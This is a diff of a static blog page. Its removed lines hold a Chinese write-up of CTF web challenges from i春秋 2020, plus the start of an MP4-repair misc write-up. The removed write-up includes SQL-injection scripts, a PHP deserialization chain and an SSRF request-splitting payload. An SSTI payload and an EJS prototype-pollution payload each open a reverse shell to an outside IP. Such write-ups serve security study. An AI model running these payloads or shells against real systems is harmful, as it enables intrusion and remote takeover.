@@ -8,7 +8,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta property="og:type" content="website">
 <meta property="og:title" content="oxcccccc">
-<meta property="og:url" content="http://blog.ccreater.top/page/6/index.html">
+<meta property="og:url" content="https://www.ccreater.top/page/6/index.html">
 <meta property="og:site_name" content="oxcccccc">
 <meta property="og:locale" content="zh">
 <meta property="article:author" content="ccreater">
@@ -58,7 +58,7 @@
         <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
       </div>
     </div>
   </div>
@@ -66,704 +66,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-i春秋2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-jdk7u21反序列化复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/02/26/i%E6%98%A5%E7%A7%8B2020/" class="article-date">
-  <time class="dt-published" datetime="2020-02-26T14:02:00.620Z" itemprop="datePublished">2020-02-26</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/26/i%E6%98%A5%E7%A7%8B2020/">i春秋2020</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>sqlmap直接出来</p>
-<p>flag{2f52809e-f46c-4638-8f72-b24ec1ec6d06}</p>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤<code>union,&lt;,&gt;,=</code></p>
-<p>构造<code>http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1 and if(hex(substr(fl4g,1,1))-1,sleep(5),0)</code></p>
-<pre><code class="python">import requests
-
-&#39;http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1%20and%20if(hex(substr(fl4g,POS,1))-GUESS,sleep(5),0)&#39;
-result=&quot;666c61677b32363837656433302d356266382d343033662d383732342d61643239&quot;
-l=len(result)
-while True:
-    ended=True
-    l+=1
-    for i in range(16):
-        sql=&#39;http://ecd3dce145d342fd9d490cde15ef8239b1e8b5763640437a.changame.ichunqiu.com/?id=0%2bif(conv(substr(hex(fl4g),POS,1),16,10)-GUESS,1,sleep(5))&#39;
-        sql=sql.replace(&quot;POS&quot;,str(l))
-        sql=sql.replace(&quot;GUESS&quot;,str(i))
-        try:
-            requests.get(sql,timeout=5)
-            print(sql)
-        except :
-            result+=hex(i)[2:]
-            print(result)
-            ended=False
-            break
-    if ended:
-        break
-</code></pre>
-<h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>黑名单:<code>union.*select,or,in</code></p>
-<p>因为盲注太麻烦,所以想用preg回溯次数来绕过,但是没用,最后也只能盲注了</p>
-<p>用<code>0 ^ (1=0)</code>来盲注,因为过滤了<code>in</code>所以用sys系统库来绕过(<code>https://xz.aliyun.com/t/7169#toc-53</code>)</p>
-<p><code>0 ^ (select substr(hex(group_concat(table_name)),1,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)</code></p>
-<p>获取表名之后,还有一个难点就是,列名的获取,但是获取列名会用到<code>in</code>字符</p>
-<p>因此考虑,无列名注入<code>union select</code>那个肯定不行</p>
-<p>我们利用<code>((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>来获取flag</p>
-<p>当我们利用这个时,我们必须保证某一个相等,才能通过另外一个判断flag</p>
-<p>有一点要注意的是</p>
-<pre><code>mysql&gt; select &#39;f&#39;=&#39;F&#39;;
-+---------+
-| &#39;f&#39;=&#39;F&#39; |
-+---------+
-|       1 |
-+---------+</code></pre><p>用这种方法是无法区分大小写的,所幸这次比赛的flag都是小写</p>
-<p>脚本</p>
-<pre><code class="python">import requests
-import string
-
-sql=&quot;1 ^ ((select substr(hex(group_concat(table_name)),POS,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)=GUESS)&quot;
-#f1ag_1s_h3r3_hhhhh,users233333333333333
-result=&quot;&quot;
-# l=len(result)
-# while True:
-#     l+=1
-#     ended=True
-#     for i in string.printable:
-#         sql=&quot;1 ^ ((select 0,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;
-#         sql=sql.replace(&quot;POS&quot;,str(l))
-#         sql=sql.replace(&quot;GUESS&quot;,(result+i).encode(&quot;hex&quot;).upper())
-#         res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})
-#         print(sql)
-#         if &quot;Hello Nu1L&quot; in res.text:
-#             result+=i
-#             print(result)
-#             ended=False
-#             break
-#     if ended:
-#         break
-
-#FLAG{9AD0BB6D-634F-4AEC-9DD8-B617774CD334}
-l=len(result)
-while True:
-    l+=1
-    ended=True
-    for j in range(32,128):
-        i=chr(j)
-        sql=&quot;0 ^ ((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;
-        sql=sql.replace(&quot;POS&quot;,str(l))
-        sql=sql.replace(&quot;GUESS&quot;,&#39;0x&#39;+(result+i).encode(&quot;hex&quot;).upper())
-        res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})
-        print(sql)
-        if &quot;Hello Nu1L&quot; in res.text:
-            result+=chr(ord(i)-1)
-            print(result)
-            ended=False
-            break
-    if ended:
-        break
-</code></pre>
-<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code>class info:__call 
-public function __call($name,$argument){//反序列化
-        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
-    }</code></pre><p>flag在flag.php中</p>
-<p>文件读取点:</p>
-<pre><code class="php">class User
-public function __destruct(){//任意读
-        return file_get_contents($this-&gt;nickname);//危
-    }</code></pre>
-<pre><code class="php">if($_SESSION[&#39;login&#39;]===1){
-    require_once(&quot;flag.php&quot;);
-    echo $flag;
-}</code></pre>
-<p>现在有两种思路:</p>
-<ol>
-<li>反序列化读取文件</li>
-<li>sql注入拿到管理原密码,来读取文件(x)</li>
-</ol>
-<p>无论想干啥都得先登陆,但是不知道咋登陆</p>
-<p>考虑反序列化</p>
-<p>如果我们成功登陆,攻击入口就是update.php</p>
-<pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){
-    echo &quot;你还没有登陆呢！&quot;;
-}
-$users=new User();
-$users-&gt;update();
-if($_SESSION[&#39;login&#39;]===1){
-    require_once(&quot;flag.php&quot;);
-    echo $flag;
-}
-</code></pre>
-<p>比较奇怪的是,按我所知,想要反序列化就要登陆,登陆的话他们就自己打出flag了,所以没有反序列化的必要?</p>
-<p>认真看下好像没有die</p>
-<pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){
-    echo &quot;你还没有登陆呢！&quot;;
-}</code></pre>
-<p>反序列化的起点是:<code>$Info=unserialize($this-&gt;getNewinfo());</code></p>
-<p>终点是:</p>
-<pre><code class="php">class user
-public function __destruct(){//任意读
-        return file_get_contents($this-&gt;nickname);//危
-    }</code></pre>
-<p>或</p>
-<pre><code class="php">class Info
-public function __call($name,$argument){//反序列化
-        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
-    }</code></pre>
-<p>因为<code>__destruct</code>的数据不知道怎么拿出来,我先考虑sql注入</p>
-<p>如果,老老实实让他们序列化<code>Info</code>,好像啥都干不了</p>
-<p>想办法利用<code>safe</code>函数在<code>Info</code>里面插个类,插个<code>UpdateHelper</code>然后利用其<code>__destruct</code>方法调用<code>User</code>的<code>__toString</code>函数,</p>
-<p>再调用<code>login</code>方法,最后执行sql语句</p>
-<pre><code class="php">function safe($parm){
-    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
-    return str_replace($array,&#39;hacker&#39;,$parm);
-}
-class User{
-    public function update(){
-        $Info=unserialize($this-&gt;getNewinfo());
-        $age=$Info-&gt;age;
-        $nickname=$Info-&gt;nickname;
-        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);
-        //这个功能还没有写完 先占坑
-    }
-    public function getNewInfo(){
-            $age=$_POST[&#39;age&#39;];
-            $nickname=$_POST[&#39;nickname&#39;];
-            return safe(serialize(new Info($age,$nickname)));
-        }
-    public function __destruct(){//任意读
-            return file_get_contents($this-&gt;nickname);//危
-        }
-    public function __toString()
-    {
-        $this-&gt;nickname-&gt;update($this-&gt;age);
-        return &quot;0-0&quot;;
-    }
-}</code></pre>
-<pre><code class="php">Class UpdateHelper{
-    public $id;
-    public $newinfo;
-    public $sql;
-    public function __construct($newInfo,$sql){
-        $newInfo=unserialize($newInfo);
-        $upDate=new dbCtrl();
-    }
-    public function __destruct()
-    {
-        echo $this-&gt;sql;
-    }
-}</code></pre>
-<p>脚本:</p>
-<pre><code class="php">&lt;?php
-Class UpdateHelper{
-    public $id=0;
-    public $newinfo=&quot;&quot;;
-    public $sql;
-    public function __construct($sql){
-        $this-&gt;sql=$sql;
-    }
-//    public function __destruct()
-//    {
-//        echo $this-&gt;sql;
-//    }
-}
-class Info{
-    public $age=&quot;&quot;;
-    public $nickname=&quot;&quot;;
-    public $CtrlCase;
-    public function __construct(){
-        $this-&gt;CtrlCase=new dbCtrl();
-    }
-//    public function __call($name,$argument){//反序列化
-//        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
-//    }
-}
-class dbCtrl
-{
-    public $hostname = &quot;127.0.0.1&quot;;
-    public $dbuser = &quot;noob123&quot;;
-    public $dbpass = &quot;noob123&quot;;
-    public $database = &quot;noob123&quot;;
-//    public $hostname = &quot;127.0.0.1&quot;;
-//    public $dbuser = &quot;root&quot;;
-//    public $dbpass = &quot;123456&quot;;
-//    public $database = &quot;test&quot;;
-    public $name=&quot;admin&quot;;
-    public $password=&quot;1&quot;;
-    public $mysqli;
-    public $token;
-}
-class User
-{
-    public $id=0;
-    public $age;
-    public $nickname;
-    public function __construct()
-    {
-        $this-&gt;nickname=new Info();
-        $this-&gt;age=&#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#39;;
-    }
-}
-function escape($str)
-{
-    $evil=&#39;&#39;;
-    $len=strlen($str)+2;
-    if($len%2)
-    {
-        $evil.=&quot;union&quot;;
-        $len-=1;
-    }
-    $len/=2;
-    while($len)
-    {
-        $evil.=&quot;load&quot;;
-        $len-=1;
-    }
-    return $evil.&#39;&quot;;&#39;.$str;
-
-}
-$call__tostring=new UpdateHelper(new User());
-$ser= urlencode(serialize($call__tostring));
-echo urlencode(escape(&quot;s:8:\&quot;CtrlCase\&quot;;&quot;.urldecode($ser).&#39;;};&#39;));
-</code></pre>
-<p><code>flag{7989f259-3281-4c1c-8939-dc8bc0b5375b}</code></p>
-<h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><pre><code class="php">&lt;?php 
-    function check($str)
-    {
-        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))
-        {
-            print_r($matches);
-            return 0;
-        }
-        else
-        {
-            return 1;
-        }
-    }
-    try
-    {
-        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);
-    } 
-    catch(Exception $e)
-    {
-        echo $e-&gt;getMessage();
-    }
-    if(isset($_GET[&#39;id&#39;]))
-    {
-        $id = $_GET[&#39;id&#39;];
-    }
-    else
-    {
-        $test = $db-&gt;query(&quot;select balabala from table1&quot;);
-        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);
-        $id = $res[&#39;balabala&#39;];
-    }
-    if(check($id))
-    {
-        $query = &quot;select balabala from table1 where 1=?&quot;;
-        $db-&gt;query(&quot;set names gbk&quot;);
-        $row = $db-&gt;prepare($query);
-        $row-&gt;bindParam(1,$id);
-        $row-&gt;execute();
-    }</code></pre>
-<p>利用宽字节来逃出引号包围,payload:<code>%bf%27;</code></p>
-<p>但是没有找到有效的sql时间盲注语句,正则来延时也没用,加上select被过滤,</p>
-<p>我缺少了一个关键的知识</p>
-<p>在学长的提示下,被认为不可以堆叠注入的pdo居然可以(我哪来的认知????)</p>
-<p>然后就简单了</p>
-<pre><code>set @t=0x73656C65637420736C65657028313029;PREPARE sqla from @t;EXECUTE sqla;</code></pre><p>python脚本</p>
-<pre><code class="python">import requests
-def sql_inj(sql):
-    sql=&quot;0x&quot;+sql.encode(&quot;hex&quot;)
-    tpl=&quot;set @t=TGT;PREPARE sqla from @t;EXECUTE sqla;&quot;.replace(&quot;TGT&quot;,sql)
-    url=&quot;http://b0ae8f49254247b8815616a4711941f17f2a145a8a374167.changame.ichunqiu.com/&quot;
-    param={
-        &quot;id&quot;:&quot;\xbf\x27;&quot;+tpl
-    }
-    requests.get(url,params=param,timeout=2)
-
-#696E666F726D6174696F6E5F736368656D612C6D7973716C2C70646F746573742C706572666F726D616E63655F736368656D61
-#table1
-#balabala,eihey,fllllll4g,bbb
-result=&quot;&quot;
-count=1+len(result)
-while True:
-    lock=0
-    for i in &quot;0123456789ABCDEF&quot;:
-        #UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;tablename&#39;
-        try :
-            sql=&quot;select if(substr(hex(group_concat(COL)),POS,1)=&#39;GUESS&#39;,sleep(3),0) from TABLE WHERE&quot;.replace(&quot;COL&quot;,&quot;fllllll4g&quot;)
-            sql=sql.replace(&quot;GUESS&quot;,i).replace(&quot;TABLE&quot;,&quot;table1&quot;)
-            sql=sql.replace(&quot;WHERE&quot;,&quot;&quot;)
-            sql=sql.replace(&quot;POS&quot;,str(count))
-            sql_inj(sql)
-            print(sql)
-
-        except :
-            result+=i
-            print(result)
-            lock=1
-            break
-    if not lock:
-        break
-    count+=1
-</code></pre>
-<h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>这题让我学到一个骚操作和看到一篇好文章</p>
-<pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>利用堆叠注入查询</p>
-<pre><code>array(1) {
-  [0]=&gt;
-  string(8) &quot;FlagHere&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(5) &quot;words&quot;
-}</code></pre><pre><code>1&#39;;show create table words;#
-array(2) {
-  [0]=&gt;
-  string(5) &quot;words&quot;
-  [1]=&gt;
-  string(114) &quot;CREATE TABLE `words` (
-  `id` int(10) NOT NULL,
-  `data` varchar(20) NOT NULL
-) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
-}
-
-
-1&#39;;show create table FlagHere;#
-array(2) {
-  [0]=&gt;
-  string(8) &quot;FlagHere&quot;
-  [1]=&gt;
-  string(93) &quot;CREATE TABLE `FlagHere` (
-  `flag` varchar(100) NOT NULL
-) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
-}</code></pre><p>利用handler来读取数据</p>
-<p><code>1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p>
-<h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p><code>2</code></p>
-<p>过滤<code>import,os</code></p>
-<pre><code>{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')}}
-{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()}}
-{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()|attr('__dict__')}}
-{{config.__class__.__mro__[1].__subclasses__()[-2].__init__.__globals__['o'+'s'].__dict__['sys'+'tem']('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjM5LjEwOC4xNjQuMjE5Iiw2MDAwMykpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p|base'+'64 -d | python')}}</code></pre><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p> <a href="https://github.com/nodejs/node/issues/13296" target="_blank" rel="noopener">https://github.com/nodejs/node/issues/13296</a> </p>
-<p> <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a> </p>
-<p>这题有个upload函数</p>
-<pre><code class="javascript">app.post(&#39;/file_upload&#39;, function(req, res){
-    var ip = req.connection.remoteAddress;
-    var obj = {
-        msg: &#39;&#39;,
-    }
-    if (!ip.includes(&#39;127.0.0.1&#39;)) {
-        obj.msg=&quot;only admin&#39;s ip can use it&quot;
-        res.send(JSON.stringify(obj));
-        return 
-    }
-    fs.readFile(req.files[0].path, function(err, data){
-        if(err){
-            obj.msg = &#39;upload failed&#39;;
-            res.send(JSON.stringify(obj));
-        }else{
-            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
-            var file_name = req.files[0].originalname
-            var dir_file = __dirname + file_path + file_name
-            if(!fs.existsSync(__dirname + file_path)){
-                try {
-                    fs.mkdirSync(__dirname + file_path)
-                } catch (error) {
-                    obj.msg = &quot;file type error&quot;;
-                    res.send(JSON.stringify(obj));
-                    return
-                }
-            }
-            try {
-                fs.writeFileSync(dir_file,data)
-                obj = {
-                    msg: &#39;upload success&#39;,
-                    filename: file_path + file_name
-                } 
-            } catch (error) {
-                obj.msg = &#39;upload failed&#39;;
-            }
-            res.send(JSON.stringify(obj));    
-        }
-    })
-})</code></pre>
-<p>但是需要本地访问</p>
-<p>有一个ssrf的点:</p>
-<pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {
-    var q = req.query.q;
-    var resp = &quot;&quot;;
-    if (q) {
-        var url = &#39;http://localhost:8081/source?&#39; + q
-        var trigger = blacklist(url);
-        if (trigger === true) {
-            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
-        } else {
-            try {
-                http.get(url, function(resp) {
-                    resp.setEncoding(&#39;utf8&#39;);
-                    resp.on(&#39;error&#39;, function(err) {
-                    if (err.code === &quot;ECONNRESET&quot;) {
-                     console.log(&quot;Timeout occurs&quot;);
-                     return;
-                    }
-                   });
-
-                    resp.on(&#39;data&#39;, function(chunk) {
-                        try {
-                         resps = chunk.toString();
-                         res.send(resps);
-                        }catch (e) {
-                           res.send(e.message);
-                        }
-
-                    }).on(&#39;error&#39;, (e) =&gt; {
-                         res.send(e.message);});
-                });
-            } catch (error) {
-                console.log(error);
-            }
-        }
-    } else {
-        res.send(&quot;search param &#39;q&#39; missing!&quot;);
-    }
-})</code></pre>
-<p>我们利用nodejs 8及之前的<code>utf-8</code>转<code>latin1</code>的漏洞来进行ssrf</p>
-<pre><code>&gt; http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output
-[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p>payload:</p>
-<pre><code class="python">import hashlib
-from urllib.parse import quote, unquote
-import requests
-import socket                                                                                                          
-
-file=&#39;&#39;&#39;------WebKitFormBoundaryVneK8P7cpLasJSn8
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;
-Content-Type: ../template
-
-doctype html
-html
-  head
-
-  body
-    include ../../../../../../flag.txt
-------WebKitFormBoundaryVneK8P7cpLasJSn8--
-&#39;&#39;&#39;.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)
-body=&#39;&#39;&#39; HTTP/1.1
-Host: x
-Connection: keep-alive
-
-POST /file_upload HTTP/1.1
-Host: x
-Content-Length: %d
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVneK8P7cpLasJSn8
-Connection: keep-alive
-
-%s
-GET /core HTTP/1.1
-Host: x
-Connection: keep-alive
-x:&#39;&#39;&#39; %(len(file),file)
-body=body.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)
-uni = { 
-    &#39;/&#39;: quote(&#39;\u012f&#39;.encode(&#39;utf-8&#39;)),
-    &#39; &#39;: quote(&#39;\u0120&#39;.encode(&#39;utf-8&#39;)),
-    &#39;\n&#39;: quote(&#39;\u010a&#39;.encode(&#39;utf-8&#39;)),
-    &#39;\r&#39;: quote(&#39;\u010d&#39;.encode(&#39;utf-8&#39;)),
-    &#39;&quot;&#39;: quote(&#39;\u0122&#39;.encode(&#39;utf-8&#39;)),
-    &quot;&#39;&quot;: quote(&#39;\u0127&#39;.encode(&#39;utf-8&#39;)),
-    &#39;!&#39;: quote(&#39;\u0121&#39;.encode(&#39;utf-8&#39;)),
-    &#39;o&#39;: quote(&#39;\u016f&#39;.encode(&#39;utf-8&#39;)),
-    &#39;e&#39;: quote(&#39;\u0165&#39;.encode(&#39;utf-8&#39;)),
-}
-print(uni)
-host=&quot;&quot;
-payload = &#39;%s&#39; % body
-for c, encoded in uni.items():
-    payload = payload.replace(c, encoded)
-print(payload)
-requests.get(&quot;http://123.57.212.112:33321/core?q=&quot;+payload)
-</code></pre>
-<p><code>flag{8ed05e41-c306-4f0f-a958-6759f66890e9}</code></p>
-<h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p><code>https://xz.aliyun.com/t/7184#toc-7</code></p>
-<p><code>https://xz.aliyun.com/t/6113#toc-4</code></p>
-<pre><code>router.post(&#39;/action&#39;, function (req, res) {
-  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)} 
-  req.session.user.data = clone(req.body);
-  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  
-});</code></pre><p>类似js原型链污染的点</p>
-<p>但是需要<code>req.session.user.user==ADMIN</code></p>
-<pre><code class="javascript">router.post(&#39;/login&#39;, function (req, res) {
-  if(req.body.Submit==&quot;register&quot;){
-   if(safeKeyword(req.body.userid)){
-    res.end(&quot;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&quot;) 
-   }
-    req.session.user={
-      &#39;user&#39;:req.body.userid.toUpperCase(),
-      &#39;passwd&#39;: req.body.pwd,
-      &#39;isLogin&#39;:false
-    }
-    res.redirect(&#39;/&#39;); 
-  }
-  else if(req.body.Submit==&quot;login&quot;){
-    if(!req.session.user){res.end(&quot;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&quot;)}
-    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){
-      req.session.user.isLogin=true;
-    }
-    else{
-      res.end(&quot;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&quot;)
-    }
-
-  }
-  res.redirect(&#39;/&#39;); ;
-});
-function safeKeyword(keyword) {
-  if(keyword.match(/(admin)/is)) {
-      return keyword
-  }
-
-  return undefined
-}</code></pre>
-<p>谷歌找到<code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code>,关于<code>toUpperCase</code>的一些特性,来绕过<code>safeKeyword</code></p>
-<p>payload:<code>userid=adm%C4%B1n&amp;pwd=a&amp;action=login&amp;Submit=register</code> | <code>admın</code></p>
-<p>最后污染<code>ejs</code>来拿到flag(<code>https://xz.aliyun.com/t/6113#toc-4</code>)</p>
-<pre><code>{&quot;Submit&quot;:&quot;&quot;,&quot;lud&quot;:1,&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a; global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/39.108.164.219/60003 0&gt;&amp;1\&quot;&#39;);//&quot;}}</code></pre><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p><a href="http://www.zip下载源码" target="_blank" rel="noopener">www.zip下载源码</a></p>
-<p>输入不存在的路径发现是tp6.0.0,刚好有个session直接写的漏洞</p>
-<p>全局搜索session,发现</p>
-<pre><code class="php"> $record = session(&quot;Record&quot;);
-            if (!session(&quot;Record&quot;))
-            {
-                session(&quot;Record&quot;,$data[&quot;key&quot;]);
-            }</code></pre>
-<p>然后getshell</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/26/i春秋2020/">http://blog.ccreater.top/2020/02/26/i春秋2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/26/i%E6%98%A5%E7%A7%8B2020/" data-id="ckmn4mn30004eg4nifyhc1jzu" data-title="i春秋2020" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
-    <article id="post-某misc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/20/%E6%9F%90misc/" class="article-date">
-  <time class="dt-published" datetime="2020-02-19T16:06:19.535Z" itemprop="datePublished">2020-02-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/20/%E6%9F%90misc/">某misc</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="不知道哪里的misc"><a href="#不知道哪里的misc" class="headerlink" title="不知道哪里的misc"></a>不知道哪里的misc</h1><p>题目给了一个压缩包</p>
-<p>里面有一个加密的视频文件和未加密的图片</p>
-<p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p>
-<p>想着图片会不会有提示,用hxd打开发现末尾果然有提示</p>
-<p>kobe code</p>
-<p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p>
-<p>得到密码:<code>OAEBEYTKNRBANB</code>,成功拿到视频文件</p>
-<p>但是提示文件无法打开,用binwalk啥的弄了一会,发现里面没有藏啥</p>
-<p>于是换了个思路,猜测这题是要让我们修复mp4文件?头大</p>
-<blockquote>
-<p>一个MP4文件首先会有且只有一个“ftyp”类型的box，作为MP4格式的标志并包含关于文件的一些信息；之后会有且只有一个“moov”类型的box（Movie Box），它是一种container box，子box包含了媒体的metadata信息；MP4文件的媒体数据包含在“mdat”类型的box（Midia Data Box）中，该类型的box也是container box，可以有很多个，也可以没有（当媒体数据全部引用其他文件时），媒体数据的结构由metadata进行描述。</p>
-</blockquote>
-<p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p>
-<p>图中方框即为第一个box的head,原本应该是<code>ftyp(0x66747970)</code>而这里确实<code>66459707</code>,位置反了</p>
-<p>恢复脚本</p>
-<pre><code class="python">with open(&#39;NBA.mp4&#39;, &#39;rb&#39;) as f:
-    keydata =f.read()
-t= keydata.encode(&quot;hex&quot;)
-l=len(t)
-t2=&quot;&quot;
-for i in range(0,l,2):
-    a=t[i]
-    b=t[i+1]
-    t2+=b
-    t2+=a
-
-print t2[:100]
-t2=t2.decode(&quot;hex&quot;)
-f2 = open(&#39;NBA2.mp4&#39;, &#39;wb&#39;)
-f2.write(t2)
